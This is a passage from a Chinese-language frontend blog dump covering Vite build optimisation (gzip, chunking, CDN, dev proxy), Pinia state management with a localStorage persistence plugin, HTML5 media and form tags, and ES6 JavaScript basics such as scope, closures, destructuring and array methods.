vite为我们进行了优化，当index.html依赖的main.ts文件引用了product.html依赖的product.ts文件，而两个ts文件均引用了lodash等第三方包时，vite会将main.ts中的对lodash的引用去除，并直接通过product.ts引用lodash以缩小包体积，当然当我们设置了lodash分包后，两个文件都会直接充lodash包中引用 gzip压缩 将静态文件进行压缩，已达到减少体积的目的 Vite服务将会对静态文件进行压缩，客户端收到压缩包后进行解压 在工程化领域内存在chunk的概念，也可以叫块 块最后会被映射为js文件，但是块并不是js文件，在vite中这一概念不如webpack中明显 当我们单个chunk的大小超过500Kb后Vite会给出警告⚠️，建议我们采用分包策略，动态导入，或者调整警告阈值。 另外我们还可以用gzip来压缩chunk的体积 我们可以通过vite-plugin-compression插件实现 1234567891011121314151617181920212223242526272829import checker from &quot;vite-plugin-checker&quot;import path from &quot;path&quot;import viteCompression from &quot;vite-plugin-compression&quot;export default defineConfig(&#123; plugins: [ // 开启ts语法检测 checker(&#123;typescript: true&#125;), // viteCompression() ] build: &#123; rollupConfig: &#123; input: &#123; main: path.resolve(__dirname, &quot;./index.html&quot;), product: path.resolve(__dirname, &quot;./product.html&quot;) &#125;, output: &#123; manualChunks: (id: string) =&gt; &#123; // id为包路径名 // 对于所有路径名中包含node_module的包，都打包到vender.js中 if(id.includes(&quot;node_module&quot;)) &#123; return &quot;vender&quot; &#125; &#125; &#125; &#125; &#125;&#125;) 此时再进行打包，dist目录下除了会生成index.js以外，还会生成index.js.gz文件 此时服务端拿到打包后的代码后，如果收到请求index.js则服务端会读取index.js.gz，然后设置响应头为content-encoding: gzip此时浏览器检查收到的响应中是否包含gzip，如果有这进行解压操作，得到原本的js文件 由上面的流程可以发现解压操作需要浏览器来做，因此需要浏览器承担一部分解压的消耗。对于较小的文件进行压缩，就可能会适得其反，降低性能。 动态导入 动态导入的思想与vite的按需加载是异曲同工的 动态导入是es6的一个新特性 对于一个需要导入的包，我们只需要以函数的方式使用import就可以实现动态导入： 1import(&quot;./src/imgLoader&quot;) 这种方式的主要应用场景是在进行路由时，实现动态加载组件： 1234567891011// 以react中的路由为例const routes = [ &#123; path: &quot;/home&quot;, component: import(&quot;./src/components/Home&quot;) &#125;, &#123; path: &quot;/login&quot;, component: import(&quot;./src/components/Login&quot;) &#125;] import函数返回一个promise对象，他的原理实际上是拿到组件文件后先对组件进行编译为js，随后并不会使用&lt;script src=&quot;./src/components/login.js&quot;&gt;来引入js文件，而是在没有进入某个页面时将promise的状态设为pending，当进入该页面后，将promise的状态设为fulfilled，将&lt;script src=&quot;./src/components/login.js&quot;&gt;插入body中实现引入。 CDN加速 CDN: content delivery network内容分发网络 利用这一技术我们可以充CDN服务器上请求资源或第三方包，而不需要将第三方包打包进我们的项目中去。 使用CDN请求包的好处是，CDN服务器会根据地理位置的远近选择距离最近的可用服务器进行响应，从而加速请求。 以前在原生项目中我们使用JQuery时经常会用到cdn技术，例如充百度CDN中引入JQuery： 123&lt;head&gt; &lt;script src=&quot;https://apps.bdimg.com/libs/jquery/2.1.4/jquery.min.js&quot;&gt;&lt;/script&gt;&lt;/head&gt; 当Vite在开发环境并不能那么轻松的修改html，因此Vite可以通过vite-plugin-cdn-import插件配置cdn： 123456789101112131415161718import viteCDNPlugin from &quot;vite-plugin-cdn-import&quot;export default defineConfig(&#123; plugins: [ viteCDNPlugin(&#123; modules: [ &#123; // 需要使用CDN引入的包名称 name: &quot;lodash&quot;, // 引入后的变量名 var: &quot;_&quot;, // 引入的CDN地址 path: &quot;https://cdn.jsdelivr.net/npm/lodash@4.17.21/lodash.min.js&quot; &#125; ] &#125;) ]&#125;) 随后在组件中直接正常引入lodash即可在开发环境中使用，打包的时候rollup和vite将不会把通过cdn引入的包打包进我们的工程 需要注意⚠️的是，使用CDN引入包后，我们需要项目时刻保持联网状态才能想CDN服务器请求我们需要的包。 Vite跨域 跨域是存在于浏览器端的问题，主要是由于浏览器最核心最基础的安全功能——同源策略限制 当一个请求url的协议，域名，端口三者中任意一个与当前页面的URL不同则为跨域 发生跨域时候，服务器实际上已经响应了请求，只是浏览器对响应的请求进行了拦截，因为发送请求时浏览器是无法进行拦截的，浏览器并不知道请求的服务器是否运行跨域 Vite支持采用Proxy的方式解决跨域问题 实际上是用node代替前端对后端进行请求（因为服务端没有跨域限制） 假设有后端接口： 123456789101112const express = require(&#x27;express&#x27;)const app = express()//创建get请求app.get(&#x27;/user&#x27;,(req,res)=&gt;&#123; res.json(&#123; code:200, message:&quot;请求成功&quot; &#125;)&#125;)//端口号9001app.listen(9001) 我们直接在前端使用fetch会报跨域错误： 1234&lt;script lang=&quot;ts&quot; setup&gt;import &#123;ref,reactive &#125; from &#x27;vue&#x27;fetch(&#x27;http://localhost:9001/user&#x27;)&lt;/script&gt; 此时可以开启vite的代理 vite中在配置文件中设置： 123456789101112131415// vite.config.tsexport default defineConfig(&#123; plugins: [vue()], server:&#123; proxy:&#123; // key + 描述对象的形式 &#x27;/api&#x27;:&#123; // 遇到/api开头的请求，将其代理到targe表示的地址 target:&quot;http://localhost:9001/&quot;, //跨域地址 changeOrigin:true, //支持跨域 rewrite:(path) =&gt; path.replace(/^\\/api/, &quot;&quot;)//重写路径,替换/api &#125; &#125; &#125;&#125;) 然后将前端请求url修改为/api/user即可 webpack proxy 和 node proxy 用法都类似 需要注意的是proxy只在开发环境中生效，生产环境由于网页会上服务器，前后端分离可以使用nginx，apache等等服务器的代理实现 vite的proxy底层实现实际上就是监听前端页面端口的请求后，向服务器端口发送请求： 1234567891011121314151617181920212223242526// proxyMiddleware 中的代码import httpProxy from &#x27;http-proxy&#x27;export function proxyMiddleware( httpServer: http.Server | null, options: NonNullable&lt;CommonServerOptions[&#x27;proxy&#x27;]&gt;, config: ResolvedConfig ): Connect.NextHandleFunction &#123; // lazy require only when proxy is usedconst proxy = httpProxy.createProxyServer(opts) as HttpProxy.Server// http-proxy 模块用于转发 http 请求// 其实现的大致原理为使用 http 或 https 模块搭建 node 代理服务器，将客户端发送的请求数据转发到目标服务器，再将响应输送到客户端const http = require(&#x27;http&#x27;)const httpProxy = require(&#x27;http-proxy&#x27;)const proxy = httpProxy.createProxyServer(&#123;&#125;)//创建一个代理服务 代理到9001http.createServer((req,res)=&gt;&#123; proxy.web(req,res,&#123; target:&quot;http://localhost:9001/xm&quot;, //代理的地址 changeOrigin:true, //是否有跨域 ws:true //webSocetk &#125;)&#125;).listen(8888) Vite总结 Vite相关配置 Pinia Pinia是一款状态管理工具，是Vuex的替代品，相较于Vuex，Pinia.js具有以下特性： 完整的ts支持 轻量化，压缩后体积只有1kb 去除mutations，只有state、getters、actions actions支持同步和异步 代码扁平化没有模块嵌套，只有store的概念，store之间可以自由使用，每一个store都是独立的 无需手动添加store，store一旦创建便会自动添加 支持Vue3和Vue2 安装 1npm install pinia 引入 Vue3 在main.ts中进行如下引入 1234567891011import &#123; createApp &#125; from &#x27;vue&#x27;import App from &#x27;./App.vue&#x27;import &#123;createPinia&#125; from &#x27;pinia&#x27; const store = createPinia()let app = createApp(App) app.use(store) app.mount(&#x27;#app&#x27;) Vue2 12345678910111213import &#123; createPinia, PiniaVuePlugin &#125; from &#x27;pinia&#x27; Vue.use(PiniaVuePlugin)const pinia = createPinia() new Vue(&#123; el: &#x27;#app&#x27;, // other options... // ... // note the same `pinia` instance can be used across multiple Vue apps on // the same page pinia,&#125;) 修改state的方法 直接修改 在使用const store = useMyStore()方法得到store可以直接访问store中的state并对其中的数据进行修改： store.val = 2 使用patch批量修改 store.$patch(&#123; val: 2 &#125;) 使用patch函数参数形式 store.$patch((state) =&gt; &#123; val: 2 &#125;) 这种方法可以在函数中加一些业务逻辑 直接重新构造state store.$state = &#123;val:2&#125; 这种方法必需修改state中的所有值 使用actions中定义的方法修改值 store.updateVal(num) Store 解构store store中的state属性可以通过解构的方式得到，但是结构出来的数据并不具有响应式 12const store = useMyStore()const &#123;val&#125; = store 因此对store中的值进行修改不会反应到结构出来的val上 为了解决这个问题pinia提供了一个hook可以将普通变量变为响应式 123import &#123; storeToRefs &#125; from &quot;pinia&quot;const store = useMyStore()const &#123;val&#125; = storeToRefs(store) 这也无论是对val进行修改或是对store.val进行修改，或是使用actions进行修改都会同时反应到val和store.val getter和actions getter中定义一些函数，类似于计算属性，可以修饰一些值： actions中定义一些函数用于对state中的值进行操作，同时支持异步和同步，并且可以相互调用。 Pinia API $reset() 不接受任何参数，没有返回值 调用后将state设置为初始值store.$reset() $subscribe(Function, object | null) 接收一个工厂函数，函数有两个参数arg,state，分别表示影响（包含新值、旧值等等）和新的state 当state中的值发生变化就会自动调用传入的工厂函数 $onAction(Function, boolean | null) 调用actions中的方法时出发Function 接收一个工厂函数，接收一个对象arg，包含一个after回调，store实例等等 第二个参数为true时，则即使调用onAction的组件被销毁，该函数依然会继续监听 Pinia插件 持久化 pinia和vuex都不具备持久化的功能，页面刷新后其中的数据就会变为初始状态 pinia支持自定义插件，可以使用插件来实现pinia中数据的持久化： 12345678910111213141516171819202122232425262728293031323334353637383940414243444546//定义兜底变量const __piniaKey = &#x27;__PINIAKEY__&#x27;//定义入参类型type Options = &#123; key?:string&#125;//将数据存在本地const setStorage = (key: string, value: any): void =&gt; &#123; localStorage.setItem(key, JSON.stringify(value)) &#125; //存缓存中读取const getStorage = (key: string) =&gt; &#123; return (localStorage.getItem(key) ? JSON.parse(localStorage.getItem(key) as string) : &#123;&#125;)&#125; //利用函数柯丽华接受用户入参const piniaPlugin = (options: Options) =&gt; &#123; //将函数返回给pinia 让pinia 调用 注入 context return (context: PiniaPluginContext) =&gt; &#123; const &#123; store &#125; = context; const data = getStorage(`$&#123;options?.key ?? __piniaKey&#125;-$&#123;store.$id&#125;`) store.$subscribe(() =&gt; &#123; setStorage(`$&#123;options?.key ?? __piniaKey&#125;-$&#123;store.$id&#125;`, toRaw(store.$state)); &#125;) //返回值覆盖pinia 原始值 return &#123; ...data &#125; &#125;&#125;//初始化piniaconst pinia = createPinia() //注册pinia 插件pinia.use(piniaPlugin(&#123; key: &quot;pinia&quot;&#125;))","categories":[{"name":"前端","slug":"前端","permalink":"http://enderxiao.github.io/categories/%E5%89%8D%E7%AB%AF/"},{"name":"Vite","slug":"前端/Vite","permalink":"http://enderxiao.github.io/categories/%E5%89%8D%E7%AB%AF/Vite/"}],"tags":[{"name":"life","slug":"life","permalink":"http://enderxiao.github.io/tags/life/"}]},{"title":"前端H5补缺","slug":"前端H5补缺","date":"2023-08-08T07:50:55.000Z","updated":"2024-07-30T11:26:33.924Z","comments":true,"path":"2023/08/08/前端H5补缺/","permalink":"http://enderxiao.github.io/2023/08/08/%E5%89%8D%E7%AB%AFH5%E8%A1%A5%E7%BC%BA/","excerpt":"根据前端技能树补缺H5知识","text":"根据前端技能树补缺H5知识 语义化标签 &lt;header&gt; &lt;nav&gt; &lt;article&gt; &lt;section&gt; &lt;aside&gt; &lt;footer&gt; 注意： 语义化标签主要针对搜索引擎 可多次使用 IE9中需要将这些标签转化为块级元素 移动端没有兼容性问题，因此会大量使用 多媒体标签 视频标签 &lt;video&gt; 该标签支持MP4、WebM、Ogg等格式的视频，其中MP4被更多的浏览器所支持 1234567&lt;video src=&quot;media/video.mp4&quot; tyoe=&quot;video/mp4&quot;&gt;&lt;/video&gt;&lt;!-- 以下为兼容性代码，浏览器会依次寻找可以播放的video进行播放 --&gt;&lt;video width=&quot;320&quot; height=&quot;240&quot; controls&gt; &lt;source src=&quot;movie.mp4&quot; type=&quot;video/mp4&quot;&gt; &lt;source src=&quot;movie.ogg&quot; type=&quot;video/ogg&quot;&gt; 你的浏览器不支持video标签&lt;/video&gt; video常用属性 属性 值 描述 autoplay autoplay 视频自动播放（谷歌浏览器需要添加muted来解决无法自动播放的问题 controls controls 显示播放控件 width pixels 设置宽度（可以通过css设置 height pixels 设置高度（可以通过css设置 loop loop 是否循环播放 preload auto/none auto表示预先加载视频，none表示不预先加载（如果设置了autoplay则忽略该属性 src url 视频url地址 poster imgurl 加载等待的画面图片 muted muted 静音播放 音频标签 &lt;audio&gt; 该标签支持MP3、Wav、Ogg等格式，其中MP3的浏览器兼容性最好 12345678&lt;audio src=&quot;audio.mp3&quot; controls&gt;&lt;/audio&gt;&lt;!-- 以下为兼容性代码，浏览器会依次寻找可以播放的video进行播放 --&gt;&lt;audio controls&gt; &lt;source src=&quot;audio.mp3&quot; type=&quot;audio/mpeg&quot;&gt; &lt;source src=&quot;audio.ogg&quot; type=&quot;audio/ogg&quot;&gt; 你的浏览器不支持audio标签&lt;/audio&gt; 常用属性 属性 值 说明 autoplay autoplay 自动播放音频（谷歌禁用，需用js控制 controls controls 显示播放控件 loop loop 循环播放 src url 音频文件url Input表单 H5中新增了很多语义化的Input类型： 属性值 说明 email 只允许邮箱格式 url 只允许url格式 date 只允许日期格式 time 只允许时间格式 month 只允许月格式 week 只允许周格式 number 只允许数字格式 tel 手机号码 search 搜索框 color 生成一个颜色选择表 验证时必须写在form表单域中，点击提交时即可验证 表单属性 属性 值 说明 required required 不能为空 placeholder 提示文本 提示信息，存在默认值时不显示 autofocus autofocus 自动聚焦，页面加载完成后自动获取焦点 autocomplete off/on 开启时，浏览器将基于之前键入的结果给出提示，默认为打开，需要在表单内，具有name属性并且之前提交成功过 multiple multiple 可以多选文件提交，通常和type=file一起使用 其中placeholder在CSS中可以通过伪元素选择器来修改样式： 123input::placeholder &#123; color: red&#125;","categories":[{"name":"前端","slug":"前端","permalink":"http://enderxiao.github.io/categories/%E5%89%8D%E7%AB%AF/"},{"name":"HTML","slug":"前端/HTML","permalink":"http://enderxiao.github.io/categories/%E5%89%8D%E7%AB%AF/HTML/"}],"tags":[{"name":"life","slug":"life","permalink":"http://enderxiao.github.io/tags/life/"},{"name":"H5","slug":"H5","permalink":"http://enderxiao.github.io/tags/H5/"}]},{"title":"前端JS补缺ES6","slug":"前端JS补缺ES6","date":"2023-07-14T07:04:43.000Z","updated":"2024-07-30T11:26:33.924Z","comments":true,"path":"2023/07/14/前端JS补缺ES6/","permalink":"http://enderxiao.github.io/2023/07/14/%E5%89%8D%E7%AB%AFJS%E8%A1%A5%E7%BC%BAES6/","excerpt":"根据前端技能树补缺JS知识","text":"根据前端技能树补缺JS知识 作用域 作用域（scope）规定了变量能够被访问的范围，离开范围后变量即不能使用 作用域分为： 全局作用域 局部作用域 局部作用域 局部作用域可分为两类： 函数作用域 块作用域 函数作用域 在函数内部声明的变量只有函数内可以访问 1234function fun() &#123; const num = 10&#125;console.log(num) // 报错 函数内部声明的变量，外部无法访问 函数参数也是函数内部的局部变量 不同函数内部声明的变量无法访问 函数执行完毕后，内部变量实际被清空了 块作用域 JS中被&#123;&#125;包裹的部分称为代码块，块外的代码有可能无法访问 1234for (let i = 1; i &lt;= 3; i++) &#123; console.log(i)&#125;console.log(i) // 报错 let声明的变量回产生块作用域，var则不会产生块作用域 const声明的变量也会产生块作用域 不同代码间的变量无法互相访问 推荐使用let和const 块作用域是ES6后新加入的 全局作用域 在&lt;script&gt;标签和.js文件的最外层就是所谓全局作用域，全局作用域中声明的变量在任何地方都可以被访问 123456&lt;script&gt; const num = 10 function fn() &#123; console.log(num) // 10 &#125;&lt;/script&gt; 为window对象动态添加的属性默认也为全局作用域（不推荐 函数中未使用任何关键字声明的变量为全局作用域（不推荐 尽可能少使用全局变量，防止变量污染 作用域链 作用域链的本质是变量查找机制 在函数执行时，会优先查找当前作用域中的变量 如果当前作用域查找不到，则会依次逐级查找父级作用域直到全局作用域 即： 嵌套关系的作用域串联行程了作用域链 相同作用域链中按从小到大的规则查找变量 子作用域能够访问父作用域，父作用域无法访问子作用域 12345678910111213&lt;script&gt; let a = 1 let b = 2 function f() &#123; let a = 1 function g() &#123; a = 2 console.log(a) &#125; g() &#125; f() // 输出2&lt;/script&gt; 垃圾回收机制 垃圾回收机制即（Garbage Collection，GC） JS中内存的分配和回收是自动完成的，内存在不使用的时候会被垃圾回收器自动回收 内存生命周期 JS分配内存的过程一般经过以下三个生命周期： 内存分配：声明变量、函数、对象时，系统会自动分配内存 内存使用：即读写内存，也就是使用变量、函数等 内存销毁：使用完毕，由垃圾回收器自动回收不再使用的内存 注意： 全局变量一般不会回收（关闭页面才回收 一般情况下局部变量的值，不用了会被自动回收 内存泄露：程序中分配的内存由于某种原因程序未释放或无法释放叫作内存泄漏 算法说明 堆栈空间分配区别： 栈（操作系统）：由操作系统自动分配释放函数的参数值、局部变量等，基本数据类型都存放在栈中 堆（操作系统）：一般由程序员分配释放，若程序员不释放，由垃圾回收机制回收。复杂数据类型放在堆中 目前浏览器中常用的垃圾回收算法有： 引用计数法 标记清除法 引用计数法 IE采用的算法，定义内存不再使用，就是看一个对象是否有指向它的引用，没有引用了就回收对象： 算法 跟踪记录被引用的次数 如果被引用了一次，那么记录次数1，多次引用会累加++ 如果减少一个引用就减1 如果引用为0，则释放内存 问题 引用计数存在一个致命问题：嵌套引用（循环引用） 如果两个对象相互引用，尽管他们已不再使用，垃圾回收器也不会进行回收，则会导致内存泄漏 12345678function fn() &#123; let o1 = &#123;&#125; let o2 = &#123;&#125; o1.a = o2 o2.a = o1 return &#x27;引用计数无法回收&#x27;&#125;fn() 此时两个对象的引用计数一直为1，这样的相互引用则会造成大量的内存泄露 标记清除法 现代浏览器中已经不再使用引用计数法了。 标记清除法是对其的改进 算法 标记清除法将“不再使用的对象”定义为**“无法到达的对象”** 即从根部（JS中就是全局对象）出发定时扫描内存中的对象。凡是能从根部到达的对象，都是还需要使用的 那些无法由根部出发触及到的对象被标记为不再使用，稍后进行回收 由于查找对象必须从根部出发，因此对于相互引用的情况，由于其无法从根部出发找到，因此均会被回收 闭包 闭包Closure 概念：一个函数堆周围状态的引用捆绑在一起，内层函数中访问到其他外层函数的作用域 即：闭包 = 内存函数 + 外层函数的变量 最简单的函数闭包写法如下： 12345678function outer() &#123; const a = 1; function f() &#123; console.log(a) &#125; f()&#125;outer() 其中函数f和变量a构成了闭包 需要注意的是： 简单的外层函数中定义里层函数是无法形成闭包的 只有当里层函数访问了外层函数变量时，才会产生闭包 此时，在函数f内设置断点，在浏览器开发者页面的Sources标签中 -&gt; Scope标签中会显示名为Local、Closure、Global的作用域 闭包作用与写法 闭包的作用： 封闭数据，提供操作，外部可以访问函数内部的变量 它允许将函数与其所操作的某些数据（环境）关联起来 更多情况下闭包的基本格式如下： 12345678910function outer() &#123; let i = 1 function fn() &#123; console.log(i) &#125; return fn&#125;const fun = outer()fun() 闭包应用 闭包可以实现数据私有 假设现在有一个需求要记录一个函数调用的次数： 12345let i = 0function fn() &#123; i++ console.log(`函数被调用了$&#123;i&#125;次`)&#125; 此时虽然可以实现这样的效果，但是由于i的作用域是全局，则外部可以通过i = 1000来修改函数调用的次数。 因此我们可以使用闭包让变量i称为私有 12345678910function count() &#123; let i = 0 function fn() &#123; i++ console.log(i) &#125; return fn&#125;const fun = count()fun() 此时外部已经无法修改i的值了 注意： 此时调用count()()的结果始终是1，这是因为直接调用时，count()返回fn这个函数，因此相当于在全局作用域中直接访问作用域fn，这就意味着位于作用域count的变量i没有被添加到作用域链，无法被标记清除法到达，调用一次后即被销毁 调用fun()的结果才会正常累加，因为执行const fun = count()时，位于全局作用域的fun访问了局部作用域count，而count访问了局部作用域fn，因此其中i是可以被标记清除算法到达的，则不会被回收，发生了内存泄露 闭包存在的问题 会引发内存泄露（详见上例 变量提升 变量提升是JS的缺陷，仅存在于var声明变量 被var声明的变量，其声明的过程（注意仅提升声明过程，初始化过程不会提升）会被提升到当前作用域的开头 即如下代码： 12console.log(num) // undefinedvar num = 10 相当于如下代码： 123var numconsole.log(num) // undefinednum = 10 注意事项： 变量未声明即被访问会发生语法报错 变量在var声明之前即被访问，其值未undefined let/const声明的变量不存在变量提升 变量提升出现在相同（当前）作用域中 实际开发中请先声明再访问，推荐使用let/const 函数进阶 函数提升 函数允许在声明之前调用： 1234fn()function fn() &#123; console.log(&quot;函数提升&quot;)&#125; 解释器会把函数声明提升到当前作用域的最前面 但是使用函数表达式的形式声明函数时，函数不会被提升： 1234fun() // 此处报错，fun is not a functionvar fun = function() &#123; console.log(&#x27;函数表达式&#x27;)&#125; 因为变量也具有变量提升，而此时的函数定义包含在赋值语句中，因此对于变量的提升，只提升其声明部分var fun，而对其赋值部分（即函数定义）不进行提升，因此无法提前调用 函数提升的特点： 函数提升能够使函数的声明调用更灵活 函数表达式不存在提升的现象 函数提升出现在相同作用域中 函数参数 函数动态参数 arguments是函数内部内置的伪数组变量，它包含了调用函数时传入的所有实参 12345678910function getSum() &#123; let sum = 0; for (let i = 0; i &lt; arguments.length; i++) &#123; sum += arguments[i] &#125; console.log(sum)&#125;getSum(1, 2, 3) // 6getSum(2, 3, 4) // 9 arguments是一个伪数组，只存在于函数中 1arguments的作用是动态获取函数的实参 可以通过for循环一次得到传递过来的实参 剩余参数 允许将不定数量的参数作为一个数组 12345678910function getSum(..arr) &#123; let sum = 0; for (let i = 0; i &lt; arr.length; i++) &#123; sum += arr[i] &#125; console.log(sum)&#125;getSum(1, 2, 3) // 6getSum(2, 3, 4) // 9 ...是语法符号，置于函数形参之前，用于获取多余的实参 借助...的剩余实参，是个真数组 因此开发中还是提成使用剩余参数 展开运算符 展开运算符可以将一个数组进行展开 12345const a = [1, 2, 3, 4]console.log(...a)console.log(Math.max(...a))const b = [5, 6, 7]const c = [...a, ...b] 不会修改原数组 最典型的应用场景：求数组最大值、合并数组等 其返回值使用逗号隔开的 需要注意区分剩余参数和展开运算符的区别： 剩余参数：函数参数使用，得到真数组 展开运算符：数组中使用，数组展开 箭头函数 目的：箭头函数的引入是为了创造一种更简短的函数写法，并且不绑定this 使用场景：更适用于那些本来需要匿名函数的地方 写法： 12345678910111213141516171819202122const fn = (x) =&gt; &#123; console.log(x)&#125;fn(1)// 只有一个形参的时候可以省略小括号const fn1 = x =&gt; &#123; console.log(x)&#125;fn1(1)// 函数体只有一行代码的时候可以省略大括号const fn2 = x =&gt; console.log(x)fn2(1)// 函数体只有一行代码作为返回值的时候可以省略大括号和returenconst fn3 = x =&gt; x * xfn3(2)// 箭头函数可以直接返回一个对象，由于对象的&#123;&#125;与函数体的&#123;&#125;冲突了，因此需要用()包裹const fn4 = (name) =&gt; (&#123;uname: name&#125;)fn(&quot;Ender&quot;) 箭头函数属于表达式函数，因此不存在函数提升 箭头函数只有一个参数时可以省略圆括号（） 箭头函数函数体只有一行代码时可以省略花括号{}，并自动做为返回值被返回 加括号的函数体返回对象字面量表达式 箭头函数的参数 箭头函数中没有动态参数arguments，但是有剩余参数...args 123456789const getSum = (...arr) =&gt; &#123; let sum = 0; for (let i = 0; i &lt; arr.length; i++) &#123; sum += arr[i] &#125; return sum&#125;const result = getSum(2, 3, 4)console.log(result) 箭头函数的this 箭头函数不会自己创建this，之后从自己的作用域链的上一层沿用this 12345678910111213141516171819202122232425console.log(this) // windowconst fn = () =&gt; &#123; console.log(this) // window&#125;fn()// 对象方法const obj = &#123; username: &quot;Ender&quot;, sayHi: () =&gt; console.log(this) // window&#125;obj.sayHi()// 多层嵌套const obj2 = &#123; uname: &quot;Ender&quot;, sayHi: function() &#123; let i = 10 const count = () =&gt; &#123; console.log(this) // obj2 &#125; count() &#125;&#125;obj2.sayHi() 因此在开发中需要注意，事件回调函数使用this时，this未全局的window，因此DOM事件回调函数为了简便，不推荐使用箭头函数 解构赋值 数组解构 数组解构是将数组的单元值快速批量给一系列变量的简洁语法 12const arr = [100, 60, 80]const [a, b, c] = arr 典型的应用是在变量交换： 1234let a = 1let b = 3; // 注意此处必须加分号[b, a] = [a, b]console.log(a, b) 这里需要注意两个特殊的必须加分号的地方，详见后文 单元值少变量多 1const [a,b,c,d] = [1,2,3] // 此时d为undefined 单元值多变量少 1const [a,b,c] = [1,2,3,4] // a = 1, b = 2, c = 3 还可以结合剩余参数来利用这一特性： 1const [a,b,...c] = [1,2,3,4] // a = 1, b = 2, c = [3,4]真数组 防止undefined传递 可以使用类似参数默认值的方式设置默认值 1const [a = 0, b = 0] = [] // a = 0, b = 0 按需导入 12const [a, b, , d] = [1, 2, 3, 4]// a=1, b=2, d=4 多维数组 1const [a, b, [c, d] = [1, 2, [3, 4]] // a=1,b=2,c=3,d=4 对象解构 解构基本解构基本语法： 1const &#123; uname, age &#125; = &#123; uname: &quot;teacher&quot;, age: 18&#125; // 解构时按名解构，属性名与变量名需要相同 但解构时使用的变量可以通过以下方式改名： 1const &#123; uname: username, age&#125; = &#123; uname: &quot;teacher&quot;, age: 18&#125; // 注意更改后的新变量名在冒号后 数组对象的混合解构： 1const [&#123; uname, age &#125;] = [&#123; uname: &quot;佩奇&quot;, age: 6 &#125;] 多层对象解构： 1const &#123; uname, family: &#123; mother, father, sister&#125; &#125; = &#123; uname: &quot;佩奇&quot;, family: &#123; father: &#x27;猪爸爸&#x27;, mother: &#x27;猪妈妈&#x27;, sister: &#x27;乔治&#x27;&#125;, age: 18&#125; // 多级解构需要指定第次级属性名 解构方法可以直接出现在函数的参数中： 12345function render(&#123; data: myData &#125;) &#123; console.log(myData)&#125;const msg = &#123;&quot;data&quot;:[&#123;&quot;id&quot;: 1, &quot;count&quot;:20&#125;,&#123;&quot;id&quot;: 2, &quot;count&quot;:30&#125;], &quot;code&quot;: 200&#125;render(msg) 必须加分号的地方 理解执行函数前必须有分号： 12(function()&#123;&#125;)();(function()&#123;&#125;)(); 数组解构的上一句为赋值语句时必须加分号： 1234const str = &quot;pink&quot;;[1, 2, 3].map(function(item) &#123; console.log(item)&#125;) forEach forEach用于遍历某个对象，与map的区别在于只遍历不返回 123456const arr = [&#x27;red&#x27;, &#x27;green&#x27;, &#x27;blue&#x27;]arr.forEach(function(item, index)&#123; console.log(item) // 元素 console.log(index) // 索引号&#125;)// 索引号index为可选参数 forEach适合于遍历数组对象，在复杂的数组遍历过程中更方便 filter 根据筛选条件返回新数组 12345const arr = [10, 20, 30]arr.filter(function (item, index) &#123; return item &gt;= 20&#125;)// 返回值为bool类型 reduce 累计器，返回累计处理的结果，经常用于求和 123// arr.reduce(function(上一次的值, 当前值)&#123;&#125;, 起始值)const arr = [1, 5, 8]const total = arr.reduce((prev, current) =&gt; parev + current, 10) // 24 reduce的执行过程： 如果没有初始值，则上一次值以数组的第一个数组元素的值作为自己的值 每一次循环，把返回值给作为下一次循环的上一次值 如果有起始值，则起始值作为上一次的值 即如果没有起始值，则长度为n的数组，只需要循环n-1次 需要注意处理对象累加的情况： 123456789101112const Obj = [&#123; name: &quot;a&quot;, salary: 10000&#125;,&#123; name: &quot;b&quot;, salary: 10000&#125;,&#123; name: &quot;c&quot;, salary: 10000&#125;]const total = Obj.reduce((prev, current) =&gt; prev + current.salary, 0) // 可以利用第二个参数来使得prev和返回值的数据类型相同 数组方法总结 方法 作用 说明 forEach 遍历数组 不返回数组，经常用于遍历数组元素 map 迭代数组 返回新数组，返回处理之后的数组元素构成的新数组 filter 过滤数组 返回新数组，返回满足筛选条件的数组元素构成的新数组 reduce 累计器 返回累计处理的结果，常用于求和操作 对象 创建对象的三种方式 利用对象字面量创建对象 123const obj = &#123; name: &quot;ender&quot;&#125; 利用new Object创建对象 12const obj = new Object()obj.uname = &quot;ender&quot; 构造函数创建 构造函数 一种特殊的函数，用于初始化对象 可以通过构造函数来创建多个类似的对象 1234567function Pig(name, age, gender) &#123; this.name = name this.age = age this.gender = gender&#125;const pepa = new Pig(&quot;佩奇&quot;, 6, &quot;girl&quot;) 构造函数用如下两个约定来约束： 命名以大写字母开头 只能由new操作符来执行 注意事项： 使用new关键字调用函数的行为被称为实例化 实例化构造函数时没有参数可以省略 构造函数内部无需写return，返回值即为新创建的对象 构造函数内部的return返回值无效 new的执行过程 创建新对象 构造函数this指向新对象 执行构造函数代码，修改this，添加新属性 返回新对象 实例成员与静态成员 实列成员即实例化的对象具有的方法或属性 静态成员即构造函数具有的方法或属性 静态成员只能通过构造函数访问 静态方法中的this指向构造函数 123456789function Pig(name, age, gender) &#123; this.name = name this.age = age this.gender = gender&#125;Pig.eyes = 2Pig.sayHi = function() &#123; console.log(&quot;Hi&quot;)&#125; 内置构造函数 引用数据类型 Object Object.keys(obj)获取对象中所有属性名 Object.values(obj)获取对象中所有属性值 Object.assign(newObj, oldObj)对象拷贝 Array RegExp Date 包装数据类型 String Number Boolean 数组常见方法 方法 作用 说明 join 元素拼接 将数组元素拼接为字符串，连接符作为参数传递，返回字符串 find 查找元素 返回符合条件的第一个数组元素，如果没有则返回undefined every 全量检测 检测数组中是否所有元素都满足条件，通过返回true，否则返回false some 存量检测 检测数组中是否存在一个元素满足条件，通过返回true，否则返回false concat 数组合并 合并两个数组，返回合并后的新数组 sort 数组排序 对原数组元素排序 splice 删除替换 删除或替换原数组元素 reverse 反转数组 反转原数组 findIndex 查找索引 查找元素索引值 fill 数组填充 从某位置开始（参数2）到某位置结束（参数3）填充为某值（参数1），返回修改后的数组 Array.from() 伪数变真 将伪数组转换为真数组，返回真数组 字符串常见方法 方法 作用 说明 length 字符串长度 与join相反 splt('分隔符') 字符串拆分 substring(开始索引号[, 结束索引号]) 字符串截取 substr已被弃用，省略结束索引时，从开始索引一直截取到结束，注意结束索引为开区间 startsWith(子字符串[, 开搜索位置]) 是否以某字符开头，区分大小写 开搜位置从0开始，从开始位置匹配，以子字符串开头返回true，否则返回false includes(搜索字符串[, 检测位置索引号]) 是否包含，区分大小写 位置索引默认为0，从位置索引开始匹配，匹配到了返回true，否则返回false toUpperCase() 字母转换大写 toLowerCase() 字母转换小写 indexOf() 检查是否包含某字符 endsWith() 是否以某字符串结尾 与startsWith相同 replace() 替换字符串 支持正则表达式 match() 查找字符串 支持正则表达式 数字常见方法 方法 作用 说明 toFixed(n) 保留n位小数 以四舍五入的保留，不够位数则以0填充，返回值为字符串 